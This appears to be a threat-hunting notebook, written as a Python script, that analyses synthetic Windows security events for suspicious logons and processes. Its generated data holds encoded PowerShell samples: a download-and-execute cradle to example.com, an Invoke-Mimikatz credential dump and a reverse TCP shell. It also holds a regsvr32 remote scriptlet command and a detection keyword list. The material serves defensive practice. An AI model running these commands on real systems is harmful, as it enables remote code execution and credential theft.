# Jupyter Notebook for Threat Hunting Analysis
# Note: This is a Python script representation of what would be in a Jupyter notebook
# In a real portfolio, this would be saved as a .ipynb file

# Import necessary libraries
import pandas as pd
import numpy as np
import matplotlib.pyplot as plt
import seaborn as sns
from datetime import datetime, timedelta
import re
from sklearn.cluster import DBSCAN
from sklearn.preprocessing import StandardScaler

# Set plot styling
plt.style.use('ggplot')
sns.set(style="darkgrid")

# Cell 1: Load and prepare data
# In a real scenario, this would load actual log data
# For this example, we'll create synthetic data

# Create synthetic Windows Security Event data
def generate_synthetic_security_events(num_events=1000):
    # Create timestamp range (last 7 days)
    end_time = datetime.now()
    start_time = end_time - timedelta(days=7)
    timestamps = [start_time + timedelta(
        seconds=np.random.randint(0, int((end_time - start_time).total_seconds())))
        for _ in range(num_events)]
    
    # Create event data
    event_ids = np.random.choice([4624, 4625, 4634, 4648, 4688, 4672], size=num_events, p=[0.4, 0.1, 0.2, 0.1, 0.15, 0.05])
    users = np.random.choice(['admin', 'jsmith', 'alee', 'rjones', 'system', 'service_acct'], size=num_events, p=[0.1, 0.3, 0.2, 0.2, 0.1, 0.1])
    source_ips = np.random.choice(['192.168.1.10', '192.168.1.20', '192.168.1.30', '10.0.0.15', '10.0.0.20', '172.16.0.5'], size=num_events)
    
    # Add some suspicious events
    # 1. Late night logons for specific user
    for i in range(20):
        idx = np.random.randint(0, num_events)
        timestamps[idx] = timestamps[idx].replace(hour=np.random.randint(23, 24) or np.random.randint(0, 5))
        users[idx] = 'jsmith'
        event_ids[idx] = 4624
    
    # 2. Failed logon attempts
    for i in range(30):
        idx = np.random.randint(0, num_events)
        timestamps[idx] = timestamps[idx].replace(hour=np.random.randint(0, 24))
        users[idx] = 'admin'
        event_ids[idx] = 4625
        source_ips[idx] = '10.0.0.50'  # Suspicious IP
    
    # Create DataFrame
    df = pd.DataFrame({
        'Timestamp': timestamps,
        'EventID': event_ids,
        'User': users,
        'SourceIP': source_ips,
        'Computer': np.random.choice(['WORKSTATION01', 'WORKSTATION02', 'SERVER01', 'SERVER02'], size=num_events)
    })
    
    # Add process information for EventID 4688
    process_names = ['cmd.exe', 'powershell.exe', 'explorer.exe', 'svchost.exe', 'regsvr32.exe', 'rundll32.exe']
    process_paths = ['C:\\Windows\\System32\\', 'C:\\Windows\\SysWOW64\\', 'C:\\Program Files\\', 'C:\\Users\\Admin\\Downloads\\']
    
    # Add command line data
    df['ProcessName'] = np.nan
    df['CommandLine'] = np.nan
    
    for idx, row in df.iterrows():
        if row['EventID'] == 4688:
            process = np.random.choice(process_names)
            path = np.random.choice(process_paths)
            df.at[idx, 'ProcessName'] = path + process
            
            # Generate command line based on process
            if process == 'cmd.exe':
                df.at[idx, 'CommandLine'] = 'cmd.exe /c ' + np.random.choice(['dir', 'type', 'whoami', 'net user', 'ipconfig'])
            elif process == 'powershell.exe':
                df.at[idx, 'CommandLine'] = 'powershell.exe ' + np.random.choice(['-Command Get-Process', '-NoProfile -ExecutionPolicy Bypass', '-EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AcwBjAHIAaQBwAHQALgBwAHMAMQAnACkA'])
            elif process == 'regsvr32.exe':
                df.at[idx, 'CommandLine'] = 'regsvr32.exe ' + np.random.choice(['/s /u /i:http://example.com/file.sct scrobj.dll', path + 'library.dll'])
    
    # Add some suspicious PowerShell commands
    suspicious_idx = df[(df['ProcessName'] == 'C:\\Windows\\System32\\powershell.exe') & (df['User'] == 'jsmith')].sample(5).index
    for idx in suspicious_idx:
        df.at[idx, 'CommandLine'] = 'powershell.exe -EncodedCommand ' + np.random.choice(['SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoAIAAtAEQAdQBtAHAAQwByAGUAZABzAA==', 'JGMgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoIjE5Mi4xNjguMS4xMDAiLDQ0NDQpOyRzID0gJGMuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYiA9IDAuLjY1NTM1fCV7MH07d2hpbGUoKCRpID0gJHMuUmVhZCgkYiwgMCwgJGIuTGVuZ3RoKSkgLW5lIDApezskZCA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJbMC4uKCRpLTEpXSk7JHNiID0gKGlleCBcIiRkXCIgMj4mMSB8IE91dC1TdHJpbmcgKTskc2IyICA9ICRzYiArIFwiUFMgXCIgKyAocHdkKS5QYXRoICsgXCI+IFwiOyRzLldyaXRlKChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXRCeXRlcygkc2IyKSwwLCRzYjIuTGVuZ3RoKTt9OyRjLkNsb3NlKCk='])
    
    return df

# Generate data
security_events_df = generate_synthetic_security_events(1500)

# Display the first few rows
print("Sample of security event data:")
print(security_events_df.head())

# Cell 2: Basic data exploration
print("\nData shape:", security_events_df.shape)
print("\nEvent ID distribution:")
print(security_events_df['EventID'].value_counts())

print("\nUser distribution:")
print(security_events_df['User'].value_counts())

# Cell 3: Analyze authentication patterns
# Filter for logon events
logon_events = security_events_df[security_events_df['EventID'].isin([4624, 4625])].copy()
logon_events['Hour'] = logon_events['Timestamp'].dt.hour

# Analyze logon time patterns by user
plt.figure(figsize=(12, 6))
sns.countplot(x='Hour', hue='User', data=logon_events)
plt.title('Logon Events by Hour and User')
plt.xlabel('Hour of Day')
plt.ylabel('Count')
plt.xticks(range(0, 24))
# plt.savefig('logon_patterns.png')  # In a real notebook, this would save the figure
print("[Figure: Logon Events by Hour and User would be displayed here]")

# Cell 4: Analyze failed logon attempts
failed_logons = logon_events[logon_events['EventID'] == 4625].copy()

# Group by source IP and user
failed_logon_counts = failed_logons.groupby(['SourceIP', 'User']).size().reset_index(name='FailCount')
failed_logon_counts = failed_logon_counts.sort_values('FailCount', ascending=False)

print("\nTop sources of failed logon attempts:")
print(failed_logon_counts.head(10))

# Cell 5: Analyze suspicious process executions
process_events = security_events_df[security_events_df['EventID'] == 4688].copy()

# Look for suspicious PowerShell commands
suspicious_powershell = process_events[process_events['CommandLine'].str.contains('EncodedCommand|Invoke-Mimikatz|IEX|DownloadString|Net.WebClient', na=False)]

print("\nSuspicious PowerShell commands detected:")
print(suspicious_powershell[['Timestamp', 'User', 'Computer', 'CommandLine']].head())

# Cell 6: Analyze user authentication anomalies using machine learning
# Prepare data for clustering
user_auth_features = logon_events.groupby(['User', 'SourceIP']).agg(
    logon_count=('EventID', 'count'),
    failed_count=('EventID', lambda x: sum(x == 4625)),
    distinct_computers=('Computer', 'nunique'),
    avg_hour=('Hour', 'mean'),
    hour_std=('Hour', 'std')
).reset_index()

# Fill NaN values
user_auth_features['hour_std'].fillna(0, inplace=True)

# Scale features
scaler = StandardScaler()
scaled_features = scaler.fit_transform(user_auth_features[['logon_count', 'failed_count', 'distinct_computers', 'avg_hour', 'hour_std']])

# Apply DBSCAN clustering
dbscan = DBSCAN(eps=0.8, min_samples=3)
user_auth_features['cluster'] = dbscan.fit_predict(scaled_features)

print("\nUser authentication anomalies detected:")
print(user_auth_features[user_auth_features['cluster'] == -1])

# Cell 7: Analyze process execution chains
def extract_parent_child_processes(df):
    # In a real scenario, this would extract parent-child relationships from actual data
    # For this example, we'll create synthetic relationships
    process_chains = [
        {'parent': 'explorer.exe', 'child': 'cmd.exe', 'user': 'jsmith', 'timestamp': datetime.now() - timedelta(hours=3)},
        {'parent': 'cmd.exe', 'child': 'powershell.exe', 'user': 'jsmith', 'timestamp': datetime.now() - timedelta(hours=3, minutes=1)},
        {'parent': 'powershell.exe', 'child': 'regsvr32.exe', 'user': 'jsmith', 'timestamp': datetime.now() - timedelta(hours=3, minutes=2)},
        {'parent': 'explorer.exe', 'child': 'browser.exe', 'user': 'alee', 'timestamp': datetime.now() - timedelta(hours=5)},
        {'parent': 'browser.exe', 'child': 'cmd.exe', 'user': 'alee', 'timestamp': datetime.now() - timedelta(hours=5, minutes=30)},
        {'parent': 'cmd.exe', 'child': 'powershell.exe', 'user': 'alee', 'timestamp': datetime.now() - timedelta(hours=5, minutes=31)},
    ]
    return pd.DataFrame(process_chains)

process_chains_df = extract_parent_child_processes(security_events_df)

print("\nSuspicious process chains:")
print(process_chains_df)

# Cell 8: Conclusions and findings
print("\nThreat Hunting Findings:")
print("1. Detected unusual after-hours logon activity for user 'jsmith'")
print("2. Identified multiple failed logon attempts from IP 10.0.0.50 targeting the 'admin' account")
print("3. Discovered suspicious PowerShell commands with encoded payloads")
print("4. Detected anomalous authentication patterns for certain user-IP combinations")
print("5. Identified suspicious process execution chain: explorer.exe → cmd.exe → powershell.exe → regsvr32.exe")

print("\nRecommended Actions:")
print("1. Investigate user 'jsmith' for potential account compromise")
print("2. Block IP 10.0.0.50 and investigate the source of brute force attempts")
print("3. Implement PowerShell constrained language mode and script block logging")
print("4. Review and enhance endpoint detection and response (EDR) rules")
print("5. Implement additional monitoring for suspicious process chains")